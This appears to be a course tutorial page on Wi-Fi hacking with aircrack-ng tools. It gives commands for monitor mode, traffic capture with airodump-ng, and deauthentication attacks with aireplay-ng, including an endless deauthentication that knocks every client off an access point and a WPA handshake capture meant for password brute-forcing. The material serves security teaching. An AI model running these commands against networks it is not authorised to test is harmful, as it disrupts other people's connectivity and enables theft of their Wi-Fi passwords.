.. _wireless_hacking:

Wireless hacking
~~~~~~~~~~~~~~~~

All of the commands in this section needs root privileges.

.. _wireless_hacking_switch_wireless_to_monitor_mode:

Set wireless interface to Monitor mode
======================================

 Get to know the wireless interface name and basic properties:

.. sourcecode::

    iw dev

Response:

.. sourcecode::

    phy#0
        Interface wlp6s0
            ifindex 3
            wdev 0x1
            addr XX:XX:XX:XX:XX:XX
            ssid wifi-name
            type managed
            channel 7 (2442 MHz), width: 20 MHz, center1: 2442 MHz
            txpower 15.00 dBm

To set wireless interface to Monitor mode with iw you can use the following command sequence:

.. sourcecode::

    ip link set IFACE down
    iw IFACE set monitor control
    ip link set IFACE up

To change back to managed mode. Run following commands:

.. sourcecode::

    ip link set IFACE down
    iw IFACE set type managed
    ip link set IFACE up

.. note::

    Where IFACE replace with actual name of your wireless interface. From output of iw dev, we would use **wlp6s0**.

Alternatively we can change the mode with `airmon-ng <https://www.aircrack-ng.org/doku.php?id=airmon-ng>`_ tool.

Before putting a card into monitor mode, check for interfering processes, by running the following command:

.. sourcecode::

    airmon-ng check

This command stops network managers then kill interfering processes left:

.. sourcecode::

    airmon-ng check kill

Make sure to verify the processes again, since systemd might start something we have just killed. Once the list is empty, start monitor mode:

.. sourcecode::

    airmon-ng start IFACE

.. note::

    Where IFACE replace with actual name of your wireless interface. From output of iw dev, we would use **wlp6s0**. Airmon-ng will create a monitor mode interface called **wlp6s0mon**.

.. _wireless_hacking_capture_air_traffic:

Capture packets in the air
==========================

To capture :ref:`packets <cyber501x:unit4_packets_routing>` in the air we use `airodump-ng <https://www.aircrack-ng.org/doku.php?id=airodump-ng>`_. To see all accessible APs just run command:

.. sourcecode::

    airodump-ng wlp6s0mon

Scan all trafic on AP with SSID :ref:`cyber501x:unit4_mac` XX:XX:XX:XX:XX:XX on chanel 11 and store the output to SCAN_name via interface wlp6s0mon.

.. sourcecode::

    sudo airodump-ng -c 11 -w SCAN_name --bssid XX:XX:XX:XX:XX:XX wlp6s0mon

.. note::

    We are trying to capture WPA 4-way handshake and perform a WPA bruteforce attack on the password.

To capture WPA handshake attacker might wait for one, or attacker can speed thing out and deauthenticate client. A simple deauthentication attack will force a victim to reauthenticate. The attacker can than sniff the WPA 4-way handshake and perform a WPA bruteforce attack on the password.

To do so we use `aireplay-ng <https://www.aircrack-ng.org/doku.php?id=aireplay-ng>`_. Send deauthentication request to particular client run command:

.. sourcecode::

    sudo aireplay-ng -0 0 -c YY:YY:YY:YY:YY:YY -a XX:XX:XX:XX:XX:XX wlp6s0mon

where `XX:XX:XX:XX:XX:XX` is AP :ref:`cyber501x:unit4_mac` and `YY:YY:YY:YY:YY:YY` is :ref:`cyber501x:unit4_mac` of client we want to deauthenticate. To perform a DDOS attack on a network just dont specify the client. This way we deauthenticate all clients of the AP. Parameter `-0 0` means it will run deauthentication in an infinite loop.